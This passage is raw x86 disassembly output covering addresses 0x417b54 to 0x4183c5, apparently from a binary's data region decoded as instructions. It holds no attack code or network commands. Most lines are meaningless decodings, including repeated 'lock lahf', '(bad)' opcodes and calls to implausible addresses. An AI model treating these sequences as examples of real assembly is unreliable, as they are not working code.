  417b54:	lock lahf 
  417b56:	add    DWORD PTR [eax],eax
  417b58:	lock lahf 
  417b5a:	add    DWORD PTR [eax],eax
  417b5c:	lock lahf 
  417b5e:	add    DWORD PTR [eax],eax
  417b60:	lock lahf 
  417b62:	add    DWORD PTR [eax],eax
  417b64:	lock lahf 
  417b66:	add    DWORD PTR [eax],eax
  417b68:	lock lahf 
  417b6a:	add    DWORD PTR [eax],eax
  417b6c:	lock lahf 
  417b6e:	add    DWORD PTR [eax],eax
  417b70:	lock lahf 
  417b72:	add    DWORD PTR [eax],eax
  417b74:	lock lahf 
  417b76:	add    DWORD PTR [eax],eax
  417b78:	lock lahf 
  417b7a:	add    DWORD PTR [eax],eax
  417b7c:	lock popf 
  417b7e:	add    DWORD PTR [eax],eax
  417b80:	lock popf 
  417b82:	add    DWORD PTR [eax],eax
  417b84:	lock popf 
  417b86:	add    DWORD PTR [eax],eax
  417b88:	lock popf 
  417b8a:	add    DWORD PTR [eax],eax
  417b8c:	lock popf 
  417b8e:	add    DWORD PTR [eax],eax
  417b90:	lock popf 
  417b92:	add    DWORD PTR [eax],eax
  417b94:	lock popf 
  417b96:	add    DWORD PTR [eax],eax
  417b98:	lock popf 
  417b9a:	add    DWORD PTR [eax],eax
  417b9c:	lock popf 
  417b9e:	add    DWORD PTR [eax],eax
	...
  417bb0:	add    BYTE PTR [eax],al
  417bb2:	lock push es
  417bb4:	call   0x7069ae9f
  417bb9:	outs   dx,DWORD PTR ds:[esi]
  417bba:	stos   DWORD PTR es:[edi],eax
  417bbb:	mov    al,ds:0x6f4ab895
  417bc0:	adc    eax,0x6ff6c230
  417bc5:	outs   dx,DWORD PTR ds:[esi]
  417bc6:	stos   DWORD PTR es:[edi],eax
  417bc7:	mov    al,ds:0x2832e6e8
  417bcc:	addr16 add al,0xb0
  417bcf:	push   es
  417bd0:	mov    DWORD PTR [ebx],0x3ef0700
  417bd6:	hlt    
  417bd7:	push   es
  417bd8:	jmp    0xe7d1d2e0
  417bdd:	add    esi,DWORD PTR [eax+0x7]
  417be0:	out    0x3,eax
  417be2:	mov    al,0x6
  417be4:	out    0x3,eax
  417be6:	adc    BYTE PTR [edi],al
  417be8:	out    0x3,eax
  417bea:	loopne 0x417bf2
  417bec:	out    0x3,eax
  417bee:	clc    
  417bef:	push   es
  417bf0:	out    0x3,eax
  417bf2:	in     al,dx
  417bf3:	push   es
  417bf4:	out    0x3,eax
  417bf6:	repnz push es
  417bf8:	out    0x3,eax
  417bfa:	pop    ss
  417bfb:	nop
  417bfc:	out    0x83,eax
  417bfe:	lock push es
  417c00:	out    0x43,eax
  417c02:	lock push es
  417c04:	out    0xe3,eax
  417c06:	dec    DWORD PTR [edi-0x70080c19]
  417c0c:	out    0xb,eax
  417c0e:	lock push es
  417c10:	out    0xff,eax
  417c12:	out    0x8f,eax
  417c14:	out    0x5,eax
	...
  417c26:	add    BYTE PTR [eax],al
  417c28:	lock push es
  417c2a:	out    0x4,eax
  417c2c:	lock push es
  417c2e:	addr16 add esi,eax
  417c31:	push   es
  417c32:	daa    
  417c33:	add    al,0xf0
  417c35:	push   es
  417c36:	pop    es
  417c37:	add    al,0xf0
  417c39:	push   es
  417c3a:	xlat   BYTE PTR ds:[ebx]
  417c3b:	add    esi,eax
  417c3d:	push   es
  417c3e:	add    cl,ah
  417c40:	repz push es
  417c42:	add    ch,ah
  417c44:	repz push es
  417c46:	add    bl,ch
  417c48:	repz push es
  417c4a:	add    al,ch
  417c4c:	repz push es
  417c4e:	add    cl,dl
  417c50:	mov    ds:0x83f11fe7,eax
  417c55:	pop    es
  417c56:	add    al,al
  417c58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c59:	call   0x8be5c7c
  417c5e:	push   DWORD PTR [edx-0x2cde22bb]
  417c64:	pop    ebp
  417c65:	std    
  417c66:	add    DWORD PTR [edx],esp
  417c68:	inc    edi
  417c69:	fisub  WORD PTR [eax]
  417c6b:	pop    ds
  417c6c:	inc    edx
  417c6d:	loope  0x417c94
  417c6f:	test   DWORD PTR [ecx+0x1],0xdc210c06
  417c76:	and    ah,ah
  417c78:	inc    eax
  417c79:	cld    
  417c7a:	add    bh,ch
  417c7c:	daa    
  417c7d:	(bad)  [ebx]
  417c7f:	aad    0x1f
  417c81:	sti    
  417c82:	add    edx,edx
  417c84:	push   ds
  417c85:	inc    BYTE PTR [eax]
  417c87:	call   0xf1478781
	...
  417c9c:	add    BYTE PTR [eax],al
  417c9e:	in     eax,0x2
  417ca0:	push   cs
  417ca1:	out    0x4,al
  417ca3:	not    BYTE PTR [edx]
  417ca5:	test   BYTE PTR [esi+ebp*8],0x1b
  417ca9:	hlt    
  417caa:	add    edi,ebp
  417cac:	adc    al,0xe9
  417cae:	test   DWORD PTR [ecx+ebx*1],0x6f2f0e7
  417cb5:	xlat   BYTE PTR ds:[ebx]
  417cb6:	(bad)  
  417cb8:	add    BYTE PTR [eax],al
  417cba:	icebp  
  417cbb:	sti    
  417cbc:	add    eax,0xff02dd03
  417cc1:	add    BYTE PTR [ebp-0x5e00dc14],ah
  417cc7:	icebp  
  417cc8:	and    al,0x0
  417cca:	mov    ebx,0xe22f1da6
  417ccf:	mov    dl,0x23
  417cd1:	aaa    
  417cd2:	clc    
  417cd3:	mov    dh,0x2a
  417cd5:	sub    DWORD PTR [eax-0x76e0e65d],ebp
  417cdb:	mov    ?,esi
  417cdd:	add    BYTE PTR [ecx-0x66fffff6],cl
  417ce3:	or     bh,ch
  417ce5:	dec    DWORD PTR [ebp-0x72ff0172]
  417ceb:	or     bh,ch
  417ced:	add    BYTE PTR [ebp+0x5dfffe8e],cl
  417cf3:	or     al,BYTE PTR [eax]
  417cf5:	add    BYTE PTR [ecx+0xa],bl
  417cf8:	std    
  417cf9:	dec    DWORD PTR [ecx-0x72]
  417cfc:	std    
  417cfd:	dec    DWORD PTR [ecx-0x72]
  417d00:	inc    BYTE PTR [eax]
	...
  417d12:	add    BYTE PTR [eax],al
  417d14:	pop    ebp
  417d15:	mov    ?,esi
  417d17:	add    BYTE PTR [ecx-0x72],bl
  417d1a:	std    
  417d1b:	dec    DWORD PTR [ebp-0x72]
  417d1e:	std    
  417d1f:	add    BYTE PTR [ebp+0xa],cl
  417d22:	std    
  417d23:	add    BYTE PTR [ecx],bl
  417d25:	or     al,BYTE PTR [eax]
  417d27:	add    DWORD PTR ds:0xd00000a,ecx
  417d2d:	mov    ?,ebp
  417d2f:	dec    DWORD PTR [ecx]
  417d31:	mov    ?,ebp
  417d33:	add    BYTE PTR [ecx],bl
  417d35:	mov    ?,ebp
  417d37:	add    BYTE PTR [ecx],bl
  417d39:	mov    ?,esi
  417d3b:	dec    DWORD PTR [ecx]
  417d3d:	mov    ?,esi
  417d3f:	dec    DWORD PTR [ecx]
  417d41:	or     bh,ch
  417d43:	add    cl,bl
  417d45:	or     ebp,edi
  417d47:	add    ch,cl
  417d49:	(bad)  
  417d4a:	std    
  417d4b:	add    ch,cl
  417d4d:	or     ebp,edi
  417d4f:	dec    ebp
  417d51:	or     DWORD PTR [eax],eax
  417d53:	add    eax,esi
  417d55:	fwait
  417d56:	add    DWORD PTR [eax],eax
  417d58:	icebp  
  417d59:	mov    ds:0x9fbfff01,eax
  417d5e:	add    DWORD PTR [eax],eax
  417d60:	lock mov ds:0x9baffffd,eax
  417d66:	std    
  417d67:	(bad)  
  417d68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d69:	lahf   
  417d6a:	add    DWORD PTR [eax],eax
  417d6c:	icebp  
  417d6d:	lahf   
  417d6e:	add    edi,edi
  417d70:	xchg   edi,eax
  417d71:	mov    ds:0x9bf0fefd,eax
  417d76:	add    DWORD PTR [eax],eax
	...
  417d88:	add    BYTE PTR [eax],al
  417d8a:	lock lahf 
  417d8c:	add    edi,edi
  417d8e:	lock lahf 
  417d90:	std    
  417d91:	(bad)  
  417d92:	lock lahf 
  417d94:	add    DWORD PTR [eax],eax
  417d96:	icebp  
  417d97:	lahf   
  417d98:	add    DWORD PTR [eax],eax
  417d9a:	icebp  
  417d9b:	lahf   
  417d9c:	std    
  417d9d:	call   FWORD PTR [edi-0x65]
  417da0:	add    edi,edi
  417da2:	lock lahf 
  417da4:	add    edi,edi
  417da6:	dec    edi
  417da7:	lahf   
  417da8:	std    
  417da9:	inc    BYTE PTR [edi-0x5d]
  417dac:	add    DWORD PTR [eax],eax
  417dae:	icebp  
  417daf:	lahf   
  417db0:	std    
  417db1:	push   DWORD PTR [edi]
  417db3:	mov    ds:0x9bf00001,eax
  417db8:	std    
  417db9:	push   eax
  417dbb:	mov    ds:0x9b1ffefd,eax
  417dc0:	std    
  417dc1:	(bad)  
  417dc2:	lock mov ds:0x9f0fff01,eax
  417dc8:	add    edi,edi
  417dca:	lock mov ds:0x9bf0fffd,eax
  417dd0:	add    DWORD PTR [eax],eax
  417dd2:	icebp  
  417dd3:	mov    ds:0x9aeffffd,eax
  417dd8:	std    
  417dd9:	(bad)  
  417dda:	out    0x9e,eax
  417ddc:	std    
  417ddd:	(bad)  
  417dde:	lock push es
  417de0:	jmp    0x417de1
  417de2:	xlat   BYTE PTR ds:[ebx]
  417de3:	mov    edi,fs
  417de5:	dec    edi
  417de7:	pop    es
  417de8:	out    0xff,eax
  417dea:	mov    DWORD PTR [edi],0x3e7
	...
  417e00:	lock push es
  417e02:	jmp    0x417e07
  417e04:	mov    bh,0x8c
  417e06:	out    0xff,eax
  417e08:	scas   al,BYTE PTR es:[edi]
  417e09:	mov    edi,fs
  417e0b:	add    esi,eax
  417e0d:	push   es
  417e0e:	jecxz  0x417e13
  417e10:	lahf   
  417e11:	pop    es
  417e12:	mov    DWORD PTR [ebx-0x7c187900],0x83e786f0
  417e1c:	lock push es
  417e1e:	mov    DWORD PTR [ebx+0x3e706e0],0x3c706e0
  417e28:	lock push es
  417e2a:	mov    DWORD PTR [ebx],0x83c78700
  417e30:	lock xchg BYTE PTR [edi],al
  417e33:	add    al,0xf0
  417e35:	xchg   BYTE PTR [edi],al
  417e37:	test   al,ah
  417e39:	xchg   bh,ah
  417e3b:	and    eax,0xffffff86
  417e3e:	out    0x3,eax
  417e40:	lock xchg bh,ah
  417e43:	xor    eax,0xffffff86
  417e46:	out    0x3,eax
  417e48:	add    BYTE PTR [edi],al
  417e4a:	pop    es
  417e4b:	add    al,0xf0
  417e4d:	push   es
  417e4e:	pop    es
  417e4f:	add    al,0x0
  417e51:	xchg   edi,esp
  417e53:	add    DWORD PTR [eax],0x7
  417e56:	mov    DWORD PTR [ebx],0x83c706e0
  417e5c:	lock xchg bh,ah
  417e5f:	add    esi,eax
  417e61:	push   es
  417e62:	out    0x3,eax
	...
  417e74:	add    BYTE PTR [eax],al
  417e76:	lock xchg bh,ah
  417e79:	xor    eax,0x6
  417e7c:	add    cl,cl
  417e7e:	jae    0x417e76
  417e80:	(bad)  
  417e81:	call   0x9c17579
  417e86:	in     al,dx
  417e87:	idiv   bh
  417e89:	or     ah,dh
  417e8b:	push   es
  417e8c:	sub    cl,0xf3
  417e8f:	push   es
  417e90:	add    cl,ch
  417e92:	jae    0x417e8a
  417e94:	dec    DWORD PTR [eax]
  417e96:	ins    BYTE PTR es:[edi],dx
  417e97:	push   es
  417e98:	add    cl,ch
  417e9a:	jae    0x417e92
  417e9c:	jg     0x417e87
  417e9e:	repz idiv BYTE PTR [edi+0x9]
  417ea2:	je     0x417eaa
  417ea4:	add    cl,ch
  417ea6:	repz push es
  417ea8:	add    cl,cl
  417eaa:	jae    0x417ea2
  417eac:	dec    eax
  417eae:	repz idiv BYTE PTR [edi-0x17]
  417eb2:	repz idiv bh
  417eb5:	enter  0x673,0x80
  417eb9:	jmp    0xe9c175b1
  417ebe:	jae    0x417eb6
  417ec0:	jg     0x417eab
  417ec2:	jae    0x417eca
  417ec4:	add    cl,ch
  417ec6:	repz idiv BYTE PTR [edi-0x17]
  417eca:	jae    0x417ed2
  417ecc:	or     BYTE PTR [ecx],0xec
  417ecf:	push   es
  417ed0:	add    BYTE PTR [ecx],cl
  417ed2:	je     0x417eca
  417ed4:	jg     0x417edf
  417ed6:	ins    BYTE PTR es:[edi],dx
  417ed7:	idiv   bh
  417ed9:	or     BYTE PTR [eax],al
	...
  417eeb:	add    ah,dh
  417eed:	push   es
  417eee:	add    cl,ch
  417ef0:	jae    0x417ef8
  417ef2:	add    cl,ch
  417ef4:	repz push es
  417ef6:	or     cl,0x73
  417ef9:	push   es
  417efa:	add    cl,ch
  417efc:	jae    0x417ef4
  417efe:	jg     0x417ee9
  417f00:	repz idiv bh
  417f03:	enter  0x6f3,0x80
  417f07:	add    BYTE PTR [ecx],ch
  417f09:	pop    es
  417f0a:	adc    BYTE PTR [eax],al
  417f0c:	mov    ecx,0xb9800086
  417f11:	push   es
  417f12:	add    BYTE PTR [eax+0x1006a9],al
  417f18:	leave  
  417f19:	xchg   BYTE PTR [eax],dl
  417f1b:	add    cl,bl
  417f1d:	push   es
  417f1e:	add    BYTE PTR [eax],al
  417f20:	fld    DWORD PTR [esi-0x7d168000]
  417f26:	add    BYTE PTR [eax],al
  417f28:	leave  
  417f29:	push   es
  417f2a:	add    BYTE PTR [eax-0x7feffd07],al
  417f30:	stc    
  417f31:	adc    BYTE PTR [eax],0x80
  417f34:	mov    DWORD PTR [esi+0x8a10010],eax
  417f3a:	add    BYTE PTR [eax],al
  417f3c:	cdq    
  417f3d:	or     BYTE PTR [edx],al
  417f3f:	or     BYTE PTR [ecx-0x6efffffa],bl
  417f45:	push   es
  417f46:	add    cl,BYTE PTR [eax]
  417f48:	mov    DWORD PTR [eax],ecx
  417f4a:	add    BYTE PTR [eax],cl
  417f4c:	pop    ecx
  417f4d:	push   es
	...
  417f62:	push   ecx
  417f63:	or     BYTE PTR [edx],al
  417f65:	add    BYTE PTR [ecx+0x8],cl
  417f68:	add    BYTE PTR [eax],cl
  417f6a:	popa   
  417f6b:	push   es
  417f6c:	add    al,BYTE PTR [eax]
  417f6e:	inc    ecx
  417f6f:	push   es
  417f70:	add    BYTE PTR [eax],cl
  417f72:	push   ecx
  417f73:	push   es
  417f74:	add    BYTE PTR [eax],cl
  417f76:	dec    ecx
  417f77:	push   es
  417f78:	add    al,BYTE PTR [eax]
  417f7a:	inc    ecx
  417f7b:	or     BYTE PTR [edx],al
  417f7d:	or     BYTE PTR [ecx],ah
  417f7f:	push   es
  417f80:	add    al,BYTE PTR [eax]
  417f82:	sbb    DWORD PTR [esi],eax
  417f84:	add    cl,BYTE PTR [eax]
  417f86:	adc    DWORD PTR [eax],ecx
  417f88:	add    BYTE PTR [eax],al
  417f8a:	or     DWORD PTR [esi],eax
  417f8c:	add    BYTE PTR [eax],cl
  417f8e:	add    DWORD PTR [esi],eax
  417f90:	add    BYTE PTR [eax],al
  417f92:	lock lahf 
  417f94:	inc    DWORD PTR [ecx]
  417f96:	call   0xf1417f3a
  417f9b:	lahf   
  417f9c:	inc    DWORD PTR [ecx]
  417f9e:	lock lahf 
  417fa0:	add    DWORD PTR [edx],eax
  417fa2:	clc    
  417fa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fa4:	add    DWORD PTR [edx],eax
  417fa6:	call   0xf0437f52
  417fab:	xchg   edi,eax
  417fac:	(bad)  
  417fad:	(bad)  
  417fae:	clc    
  417faf:	lahf   
  417fb0:	inc    DWORD PTR [ecx]
  417fb2:	lock lahf 
  417fb4:	add    DWORD PTR [edx],eax
  417fb6:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fb8:	(bad)  
  417fb9:	(bad)  
  417fba:	call   0xf0418156
  417fbf:	xchg   edi,eax
  417fc0:	inc    DWORD PTR [ecx]
  417fc2:	clc    
  417fc3:	lahf   
  417fc4:	(bad)  
  417fc5:	inc    DWORD PTR [eax]
	...
  417fd7:	add    al,dh
  417fd9:	lahf   
  417fda:	add    DWORD PTR [eax],eax
  417fdc:	call   0xf8437f80
  417fe1:	lahf   
  417fe2:	add    DWORD PTR [eax],eax
  417fe4:	clc    
  417fe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fe6:	add    DWORD PTR [edx],eax
  417fe8:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fea:	(bad)  
  417feb:	push   eax
  417fed:	lahf   
  417fee:	add    DWORD PTR [edx],eax
  417ff0:	lock lahf 
  417ff2:	inc    DWORD PTR [ecx]
  417ff4:	clc    
  417ff5:	lahf   
  417ff6:	(bad)  
  417ff7:	(bad)  
  417ff8:	call   0xf041819c
  417ffd:	lahf   
  417ffe:	(bad)  
  417fff:	push   eax
  418001:	xchg   edi,eax
  418002:	add    DWORD PTR [edx],eax
  418004:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418006:	inc    DWORD PTR [ecx]
  418008:	call   0xe9417fac
  41800d:	xchg   edi,eax
  41800e:	add    DWORD PTR [eax],eax
  418010:	clc    
  418011:	lahf   
  418012:	(bad)  
  418013:	push   eax
  418015:	lahf   
  418016:	add    DWORD PTR [eax],eax
  418018:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41801a:	add    DWORD PTR [edx],eax
  41801c:	call   0xf0436f27
  418021:	(bad)  
  418022:	out    0x3,al
  418024:	repnz push es
  418026:	out    0x3,eax
  418028:	lock (bad) 
  41802a:	fiadd  WORD PTR [ecx]
  41802c:	repnz (bad) 
  41802e:	out    dx,al
  41802f:	add    esi,eax
  418031:	push   es
  418032:	out    dx,eax
  418033:	add    edx,esi
  418035:	push   es
  418036:	out    0x1,eax
  418038:	repnz push es
  41803a:	fild   WORD PTR [ebx]
	...
  41804c:	add    BYTE PTR [eax],al
  41804e:	lock (bad) 
  418050:	out    0x3,al
  418052:	repnz (bad) 
  418054:	out    dx,al
  418055:	add    eax,0x5defef0
  41805a:	lock push es
  41805c:	out    0x3,eax
  41805e:	repnz (bad) 
  418060:	out    dx,al
  418061:	add    eax,0x3ef06f2
  418066:	lock push es
  418068:	fild   WORD PTR [ebx]
  41806a:	repnz (bad) 
  41806c:	out    0x5,al
  41806e:	repnz push es
  418070:	call   0x68489058
  418075:	in     al,0x87
  418077:	mov    BYTE PTR [eax-0x1c],ch
  41807a:	jg     0x418004
  41807c:	addr16 add al,0xf0
  41807f:	push   es
  418080:	addr16 in al,0xef
  418083:	push   es
  418084:	push   0xe8077004
  418089:	add    esi,DWORD PTR [eax+0x7]
  41808c:	call   0xe7c9d874
  418091:	add    esi,eax
  418093:	push   es
  418094:	out    0xe3,eax
  418096:	mov    DWORD PTR [esi],0x6bfe3e7
  41809c:	push   0x6806b7e4
  4180a1:	add    al,0xf0
  4180a3:	push   es
  4180a4:	out    0x3,eax
  4180a6:	lock push es
  4180a8:	add    BYTE PTR [ecx-0xc],ch
  4180ab:	xchg   BYTE PTR [eax],al
  4180ad:	call   0xe84207a5
	...
  4180c2:	add    BYTE PTR [eax],al
  4180c4:	repz push es
  4180c6:	add    cl,ch
  4180c8:	adc    ecx,DWORD PTR [eax-0x790c1603]
  4180ce:	add    al,ch
  4180d0:	adc    ecx,DWORD PTR [eax]
  4180d2:	add    BYTE PTR [ecx-0xc],ch
  4180d5:	push   es
  4180d6:	add    cl,ch
  4180d8:	xrelease xchg BYTE PTR [eax],al
  4180db:	call   0x6a3f08b3
  4180e0:	int3   
  4180e1:	xchg   ebp,edi
  4180e3:	push   0xe80086f3
  4180e8:	repz push es
  4180ea:	add    BYTE PTR [ecx-0x2d],ch
  4180ed:	xchg   ebp,edi
  4180ef:	imul   esi,ebx,0x93e90086
  4180f5:	xchg   ebp,edi
  4180f7:	imul   edx,DWORD PTR [ebx-0x6c97fff9],0xf3680007
  418101:	push   es
  418102:	add    BYTE PTR [ecx-0xd],ch
  418105:	xchg   BYTE PTR [eax],al
  418107:	call   0xe94207ff
  41810c:	xchg   ebx,eax
  41810d:	pop    es
  41810e:	add    BYTE PTR [eax-0x6d],ch
  418111:	pop    es
  418112:	add    BYTE PTR [eax-0xd],ch
  418115:	push   es
  418116:	add    cl,ch
  418118:	repz push es
  41811a:	add    cl,ch
  41811c:	repz push es
  41811e:	add    cl,ch
  418120:	push   ebx
  418121:	pop    es
  418122:	add    BYTE PTR [ecx+0x53],ch
  418125:	xchg   ebp,edi
  418127:	imul   eax,DWORD PTR [eax],0x0
	...
  418139:	add    bl,dh
  41813b:	xchg   BYTE PTR [eax],al
  41813d:	push   0xe80086f3
  418142:	repz push es
  418144:	add    BYTE PTR [eax],al
  418146:	sbb    BYTE PTR [ebx-0x5c67ff83],ah
  41814c:	std    
  41814d:	dec    DWORD PTR [eax-0x7600025d]
  418153:	add    eax,DWORD PTR [eax]
  418155:	add    BYTE PTR [eax-0x67ff825d],bl
  41815b:	add    eax,DWORD PTR [eax]
  41815d:	add    BYTE PTR [eax],cl
  41815f:	add    eax,DWORD PTR [eax]
  418161:	add    BYTE PTR [ecx],cl
  418163:	mov    ds:0xad8fffd,eax
  418168:	add    BYTE PTR [eax],0xd8
  41816b:	push   0xfffffffd
  41816d:	dec    DWORD PTR [ecx+0x6a]
  418170:	jge    0x418172
  418172:	dec    eax
  418173:	or     al,BYTE PTR [eax-0x2952800]
  418179:	call   FWORD PTR [ecx+0x6b]
  41817c:	std    
  41817d:	dec    ecx
  41817f:	or     al,BYTE PTR [eax+0x7d6ac800]
  418185:	add    BYTE PTR [ecx],bl
  418187:	or     eax,DWORD PTR [eax]
  418189:	add    BYTE PTR [ecx-0x76ff7ff6],bl
  41818f:	push   0xfffffffd
  418191:	dec    DWORD PTR [ecx]
  418193:	imul   edi,DWORD PTR [ebp+0x0],0xffffff99
  418197:	or     DWORD PTR [eax],eax
  418199:	add    BYTE PTR [ecx+0x20809],bl
	...
  4181af:	add    BYTE PTR [ecx-0x76fdf7f6],cl
  4181b5:	or     DWORD PTR [eax],eax
  4181b7:	inc    edx
  4181b8:	pop    ecx
  4181b9:	or     cl,BYTE PTR [eax]
  4181bb:	add    BYTE PTR [ecx+0x9],bl
  4181be:	add    BYTE PTR [eax],al
  4181c0:	dec    ecx
  4181c1:	or     al,BYTE PTR [eax]
  4181c3:	inc    eax
  4181c4:	dec    ecx
  4181c5:	or     cl,BYTE PTR [eax]
  4181c7:	add    bl,BYTE PTR [ecx+0x9]
  4181ca:	or     BYTE PTR [eax+0x59],al
  4181cd:	or     cl,BYTE PTR [eax]
  4181cf:	add    al,dh
  4181d1:	outs   dx,DWORD PTR ds:[esi]
  4181d2:	add    al,BYTE PTR [eax]
  4181d4:	repnz outs dx,DWORD PTR ds:[esi]
  4181d6:	add    cl,BYTE PTR [eax]
  4181d8:	mov    al,0x6f
  4181da:	add    al,BYTE PTR [eax]
  4181dc:	mov    dl,0x6f
  4181de:	add    DWORD PTR [eax],ecx
  4181e0:	mov    dl,0x6f
  4181e2:	add    cl,BYTE PTR [eax]
  4181e4:	lock outs dx,DWORD PTR ds:[esi]
  4181e6:	add    DWORD PTR [eax],eax
  4181e8:	mov    al,0x6f
  4181ea:	add    DWORD PTR [eax],eax
  4181ec:	repnz outs dx,DWORD PTR ds:[esi]
  4181ee:	add    DWORD PTR [eax],ecx
  4181f0:	mov    al,0x6f
  4181f2:	add    DWORD PTR [eax],ecx
  4181f4:	mov    al,0x6f
  4181f6:	add    DWORD PTR [eax],eax
  4181f8:	lock outs dx,DWORD PTR ds:[esi]
  4181fa:	add    al,BYTE PTR [eax]
  4181fc:	xor    BYTE PTR [eax+0x2],dh
  4181ff:	or     BYTE PTR [edx],dh
  418201:	jo     0x418205
  418203:	or     BYTE PTR [edx],dh
  418205:	jo     0x418209
  418207:	add    dl,dh
  418209:	outs   dx,DWORD PTR ds:[esi]
  41820a:	add    DWORD PTR [eax],ecx
  41820c:	xor    dh,BYTE PTR [eax+0x2]
  41820f:	add    BYTE PTR [eax],dh
  418211:	jo     0x418214
	...
  418223:	add    BYTE PTR [eax],al
  418225:	add    al,dh
  418227:	outs   dx,DWORD PTR ds:[esi]
  418228:	add    DWORD PTR [eax],eax
  41822a:	xor    dh,BYTE PTR [eax+0x2]
  41822d:	or     dl,dh
  41822f:	outs   dx,DWORD PTR ds:[esi]
  418230:	add    DWORD PTR [eax],eax
  418232:	repnz outs dx,DWORD PTR ds:[esi]
  418234:	add    DWORD PTR [eax],eax
  418236:	xor    dh,BYTE PTR [eax+0x2]
  418239:	or     al,dh
  41823b:	outs   dx,DWORD PTR ds:[esi]
  41823c:	add    DWORD PTR [eax],ecx
  41823e:	lock outs dx,DWORD PTR ds:[esi]
  418240:	add    al,BYTE PTR [eax]
  418242:	xor    dh,BYTE PTR [eax+0x2]
  418245:	add    al,dh
  418247:	outs   dx,DWORD PTR ds:[esi]
  418248:	add    DWORD PTR [eax],eax
  41824a:	repnz outs dx,DWORD PTR ds:[esi]
  41824c:	add    DWORD PTR [eax],eax
  41824e:	mov    al,0x6f
  418250:	add    DWORD PTR [eax],ecx
  418252:	repnz outs dx,DWORD PTR ds:[esi]
  418254:	add    al,BYTE PTR [eax]
  418256:	mov    dl,0x6f
  418258:	add    cl,BYTE PTR [eax]
  41825a:	mov    al,0x6
  41825c:	out    0x2,eax
  41825e:	lock or bh,ah
  418261:	add    esi,eax
  418263:	(bad)  
  418264:	out    0x3,al
  418266:	call   0xf8446933
  41826b:	or     bh,ah
  41826d:	add    bh,al
  41826f:	(bad)  
  418270:	out    0x2,al
  418272:	lock push es
  418274:	out    0x3,eax
  418276:	lock or bh,ah
  418279:	add    edi,eax
  41827b:	enter  0x2e6,0xf8
  41827f:	enter  0x2e6,0xe8
  418283:	push   es
  418284:	out    0x3,eax
  418286:	lock enter 0x2e6,0x0
	...
  41829b:	add    al,bh
  41829d:	enter  0x3e6,0xf8
  4182a1:	or     bh,ah
  4182a3:	add    esi,eax
  4182a5:	push   es
  4182a6:	out    0x3,eax
  4182a8:	call   0xf0456973
  4182ad:	enter  0x4e6,0xf8
  4182b1:	push   es
  4182b2:	out    0x4,eax
  4182b4:	lock or bh,ah
  4182b7:	add    al,0xf0
  4182b9:	(bad)  
  4182ba:	out    0x3,al
  4182bc:	clc    
  4182bd:	push   es
  4182be:	out    0x3,eax
  4182c0:	lock push es
  4182c2:	out    0x3,eax
  4182c4:	call   0xe846698f
  4182c9:	or     bh,ah
  4182cb:	add    al,0xf0
  4182cd:	(bad)  
  4182ce:	test   BYTE PTR [ebx],0xf0
  4182d1:	es out 0x3,eax
  4182d4:	xor    BYTE PTR [edi],ah
  4182d6:	out    0x43,eax
  4182d8:	lock push es
  4182da:	test   DWORD PTR [ebx-0x50],0xb003e726
  4182e1:	xlat   BYTE PTR es:[ebx]
  4182e3:	add    esi,eax
  4182e5:	push   es
  4182e6:	add    cl,bl
  4182e8:	mov    bl,0xc6
  4182ea:	pop    ds
  4182eb:	jmp    0xe94149e3
  4182f0:	mov    bl,0x6
  4182f2:	and    cl,bh
  4182f4:	mov    bl,0xc6
  4182f6:	(bad)  
  4182f7:	call   0xf94149ef
  4182fc:	repz push es
  4182fe:	and    cl,bl
	...
  418310:	add    BYTE PTR [eax],al
  418312:	repz (bad) 
  418314:	(bad)  
  418315:	call   0xe96189cd
  41831a:	repz push es
  41831c:	and    cl,bl
  41831e:	mov    bl,0x6
  418320:	add    cl,ch
  418322:	repz push es
  418324:	add    cl,bh
  418326:	repz (bad) 
  418328:	(bad)  
  418329:	clc    
  41832a:	mov    bl,0x6
  41832c:	and    cl,ch
  41832e:	xor    eax,DWORD PTR [edi]
  418330:	add    cl,ch
  418332:	xor    eax,edi
  418334:	(bad)  
  418335:	fdiv   DWORD PTR [ebx]
  418337:	pop    es
  418338:	and    cl,bl
  41833a:	repz push es
  41833c:	add    cl,bl
  41833e:	repz (bad) 
  418340:	pop    ds
  418341:	stc    
  418342:	repz (bad) 
  418344:	pop    ds
  418345:	jmp    0xf9418a3d
  41834a:	xor    eax,edi
  41834c:	(bad)  
  41834d:	call   0xd9614a85
  418352:	xor    eax,DWORD PTR [edi]
  418354:	add    cl,ch
  418356:	xor    eax,edi
  418358:	(bad)  
  418359:	call   0xe9614a91
  41835e:	repz push es
  418360:	and    cl,ch
  418362:	xor    eax,DWORD PTR [edi]
  418364:	and    cl,bh
  418366:	repz push es
  418368:	add    cl,bh
  41836a:	repz (bad) 
  41836c:	pop    ds
  41836d:	jmp    0x414a25
  418372:	dec    ecx
  418373:	(bad)  
  418374:	aas    
  418375:	and    BYTE PTR [eax],al
	...
  418387:	add    BYTE PTR [ecx+0x7],cl
  41838a:	inc    eax
  41838b:	add    BYTE PTR [ecx],bh
  41838d:	(bad)  
  41838e:	(bad)  
  41838f:	jmp    FWORD PTR [ecx]
  418391:	pop    es
  418392:	add    BYTE PTR [eax],ah
  418394:	pop    ecx
  418395:	pop    es
  418396:	inc    eax
  418397:	add    BYTE PTR [ecx-0x39],cl
  41839a:	call   FWORD PTR [edi]
  41839c:	dec    ecx
  41839d:	pop    es
  41839e:	add    BYTE PTR [eax],ah
  4183a0:	sub    edi,eax
  4183a2:	(bad)  
  4183a3:	dec    DWORD PTR [ecx+0x7]
  4183a6:	add    BYTE PTR [eax],ah
  4183a8:	cmp    edi,eax
  4183aa:	aas    
  4183ab:	and    BYTE PTR [ecx],cl
  4183ad:	(bad)  
  4183ae:	aas    
  4183af:	add    BYTE PTR [ecx],bl
  4183b1:	pop    es
  4183b2:	inc    eax
  4183b3:	and    BYTE PTR [ecx],cl
  4183b5:	(bad)  
  4183b6:	aas    
  4183b7:	add    BYTE PTR [ecx],cl
  4183b9:	(bad)  
  4183ba:	aas    
  4183bb:	and    BYTE PTR [ecx],cl
  4183bd:	pop    es
  4183be:	add    BYTE PTR [eax],al
  4183c0:	jmp    0xc961c3cb
  4183c5:	push   es
